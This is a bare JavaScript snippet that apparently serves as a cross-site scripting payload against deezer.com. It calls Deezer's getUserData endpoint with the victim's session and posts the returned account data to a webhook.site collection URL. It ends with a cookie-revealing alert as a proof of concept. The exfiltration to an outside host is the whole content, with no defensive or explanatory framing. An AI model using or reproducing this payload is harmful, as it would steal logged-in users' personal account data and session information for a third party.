fetch('https://www.deezer.com/ajax/gw-light.php?method=deezer.getUserData&input=1&api_version=1.0&api_token=')
  .then(r => r.text())
  .then(d => fetch('https://webhook.site/a90fcf0f-218a-46ef-a113-6bc249382768', {method:'POST', body:d}))


alert(document.cookie);